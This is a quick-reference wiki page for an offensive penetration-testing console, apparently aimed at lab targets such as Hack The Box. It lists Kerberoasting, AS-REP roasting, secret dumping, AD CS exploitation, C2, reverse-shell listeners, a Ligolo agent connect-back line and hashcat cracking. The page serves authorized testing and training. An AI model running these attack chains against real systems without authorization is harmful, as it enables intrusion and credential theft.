---
layout: default
title: Quick Reference - UwU Toolkit
permalink: /uwu-toolkit/quick-reference/
---

# Quick Reference

Cheat sheet for common UwU Toolkit tasks.

---

## Installation

```bash
git clone https://github.com/p3ta00/uwu-toolkit.git
cd uwu-toolkit
./setup.sh
uwu
```

---

## Essential Setup

```bash
# Set target
setg RHOSTS 10.10.10.100

# Set credentials
setg DOMAIN corp.local
setg USER administrator
setg PASS Password123!

# Set attack machine
setg LHOST 10.10.14.50
setg LPORT 4444

# Set Exegol container
setg EXEGOL_CONTAINER exegol-htb

# Set Claude API key
setg ANTHROPIC_API_KEY sk-ant-api03-...
```

---

## Module Workflow

```bash
search <term>           # Find modules
use <path>              # Select module
options                 # View options
set <VAR> <value>       # Set option
run                     # Execute
back                    # Return to base
```

### Quick Examples

```bash
# Kerberoast
use auxiliary/ad/kerberoast
set RHOSTS 10.10.10.100
set DOMAIN corp.local
set USER admin
set PASS Password123
run

# SMB Enumeration
use auxiliary/smb/smb_enum
set RHOSTS 10.10.10.100
run

# Auto Enumeration
use enumeration/autoenum
set RHOSTS 10.10.10.100
run
```

---

## Commands Cheat Sheet

### Core
| Command | Description |
|---------|-------------|
| `help`, `?` | Show help |
| `exit`, `quit` | Exit console |
| `clear` | Clear screen |
| `banner` | Show banner |

### Modules
| Command | Description |
|---------|-------------|
| `use <path>` | Select module |
| `back` | Deselect module |
| `info` | Module details |
| `options` | Show options |
| `run`, `exploit` | Execute module |
| `check` | Check prerequisites |
| `search <term>` | Search modules |
| `reload` | Reload module |

### Variables
| Command | Description |
|---------|-------------|
| `set <VAR> <val>` | Set session variable |
| `setg <VAR> <val>` | Set global variable |
| `unset <VAR>` | Unset session variable |
| `unsetg <VAR>` | Unset global variable |
| `vars` | Show all variables |
| `globals` | Show global variables |
| `history [VAR]` | Show variable history |

### Servers
| Command | Description |
|---------|-------------|
| `start gosh [port]` | HTTP server (default 8000) |
| `start php [port]` | PHP server (default 8080) |
| `start nc <port>` | Netcat listener |
| `stop <id>` | Stop service |
| `listeners` | List active services |

### Shell Management
| Command | Description |
|---------|-------------|
| `listen <port>` | Start shell listener |
| `shells`, `sessions` | List shells |
| `interact <id>` | Interact with shell |
| `kill <id>` | Kill shell |

### Claude AI
| Command | Description |
|---------|-------------|
| `claude`, `claude mode` | Interactive mode |
| `claude resume`, `fg` | Resume session |
| `claude ask "question"` | Quick question |
| `claude analyze <path>` | Analyze code |
| `claude debug <path>` | Debug code |
| `claude status` | Check availability |

### Sliver C2
| Command | Description |
|---------|-------------|
| `sliver start` | Start server |
| `sliver stop` | Stop server |
| `sliver connect [name]` | Connect client |
| `sliver resume`, `fg` | Resume client |
| `sliver status` | Check status |
| `sliver configs` | List configs |

### Penelope Shell Handler
| Command | Description |
|---------|-------------|
| `penelope [port]` | Start listener (default 4444) |
| `penelope resume`, `fg` | Resume session |
| `penelope status` | Check status |
| `penelope help` | Full help |

### Ligolo-ng Tunneling
| Command | Description |
|---------|-------------|
| `ligolo [port]` | Start proxy (default 11601) |
| `ligolo resume`, `fg` | Resume session |
| `ligolo agents` | List agents |
| `ligolo route add <net>` | Add route |
| `ligolo routes` | List routes |
| `ligolo status` | Check status |

### Shell Commands
| Command | Description |
|---------|-------------|
| `shell` | Interactive shell |
| `!<cmd>` | Execute shell command |
| `export` | Export variables |

---

## Common Module Paths

### Active Directory
```
auxiliary/ad/kerberoast       # Kerberoast attack
auxiliary/ad/asreproast       # AS-REP roasting
auxiliary/ad/bloodhound_collect # BloodHound data
auxiliary/ad/certipy_find     # AD CS enumeration
auxiliary/ad/certipy_exploit  # AD CS exploitation
auxiliary/ad/secretsdump      # Dump secrets
auxiliary/ad/netexec          # NetExec wrapper
auxiliary/ad/ad_enum          # AD enumeration
auxiliary/ad/kerb_userenum    # User enumeration
```

### SMB
```
auxiliary/smb/smb_enum        # Share enumeration
auxiliary/smb/smb_read        # Read files
```

### Enumeration
```
enumeration/autoenum          # Full auto enum
enumeration/nmap_scan         # Nmap wrapper
enumeration/portscan_fast     # Fast port scan
enumeration/dns_enum          # DNS enumeration
enumeration/web_fuzz          # Web fuzzing
enumeration/ftp_enum          # FTP enumeration
enumeration/nfs_enum          # NFS enumeration
```

### Post-Exploitation
```
post/linux/linpeas_enum       # LinPEAS
post/linux/pspy_monitor       # Process monitoring
post/linux/linux_recon        # Linux recon
post/windows/gather/lnk_parser # LNK parsing
post/windows/escalate/gpo_abuse # GPO abuse
```

### Payloads
```
payloads/reverse_shells       # Shell generator
```

---

## Variable History

```bash
# Interactive variable selection
set RHOSTS              # Shows history, pick from list

# View all history
history

# View specific variable history
history RHOSTS
```

---

## Resource Files

Create `.rc` files for automation:

```bash
# recon.rc
setg RHOSTS 10.10.10.100
use enumeration/autoenum
run
back
use auxiliary/smb/smb_enum
run
```

Execute:
```bash
python3 uwu -r recon.rc
```

---

## Command Line Options

```bash
python3 uwu                    # Interactive mode
python3 uwu -q                 # Quiet (no banner)
python3 uwu -r script.rc       # Execute resource file
python3 uwu -x "cmd1; cmd2"    # Execute commands
python3 uwu -h                 # Help
```

---

## Tab Completion

- **Commands** - Tab completes commands
- **Modules** - Tab completes module paths
- **Variables** - Tab completes variable names
- **Files** - Tab completes file paths

---

## Output Colors

| Color | Meaning |
|-------|---------|
| `[*]` Blue | Status/Info |
| `[+]` Green | Success |
| `[-]` Red | Error |
| `[!]` Orange | Warning |

---

## Keyboard Shortcuts

| Shortcut | Action |
|----------|--------|
| `Tab` | Autocomplete |
| `Ctrl+C` | Cancel current |
| `Ctrl+D` | Background/Exit |
| `Up/Down` | Command history |
| `Ctrl+R` | Search history |

---

## Common Workflows

### Initial Enumeration

```bash
setg RHOSTS 10.10.10.100
use enumeration/autoenum
run
```

### AD Attack Chain

```bash
# 1. Enumerate users
use auxiliary/ad/kerb_userenum
set RHOSTS 10.10.10.100
set DOMAIN corp.local
run

# 2. AS-REP Roast
use auxiliary/ad/asreproast
set USER userlist.txt
run

# 3. Kerberoast
use auxiliary/ad/kerberoast
set USER admin
set PASS Password123
run

# 4. Crack hashes offline
!hashcat -m 13100 hashes.txt rockyou.txt
```

### Post-Exploitation (Linux)

```bash
# Upload and run LinPEAS
use post/linux/linpeas_enum
set SESSION 1
run

# Monitor processes
use post/linux/pspy_monitor
set DURATION 120
run
```

### Start Services

```bash
# HTTP file server
start gosh 8000

# Listen for reverse shell
listen 4444
```

### Penelope Shell Handling

```bash
# Start Penelope listener
penelope 4444

# Receive shell, then Ctrl+D to background
# Listener stays active!

# Check shells from UwU
shells

# Resume Penelope
penelope resume
```

### Ligolo-ng Pivoting

```bash
# Start Ligolo proxy
ligolo

# On target: ./agent -connect YOUR_IP:11601 -ignore-cert
# In Ligolo: session, then start

# Ctrl+D to background, add routes from UwU
ligolo route add 10.10.10.0/24

# Now access internal network directly
!nmap -sV 10.10.10.50

# Resume Ligolo when needed
ligolo resume
```

---

## Tips

1. **Use `setg` for recurring values** - Domain, target, credentials
2. **Tab complete everything** - Faster than typing
3. **Check history** - `set VAR` without value shows history
4. **Use resource files** - Automate repetitive tasks
5. **Background sessions** - `Ctrl+D` to keep state
6. **Exegol fallback** - Tools run in container if not local

---

## Troubleshooting

### Module not found
```bash
reload          # Reload modules
show modules    # List all modules
```

### Exegol not detected
```bash
docker ps | grep exegol
setg EXEGOL_CONTAINER exegol-htb
```

### Tool not found
```bash
# Let Exegol handle it
setg EXEGOL_CONTAINER exegol-htb
```

### Permission denied
```bash
sudo uwu        # For raw sockets, etc.
```

---

[Back to Wiki Index](/uwu-toolkit/)
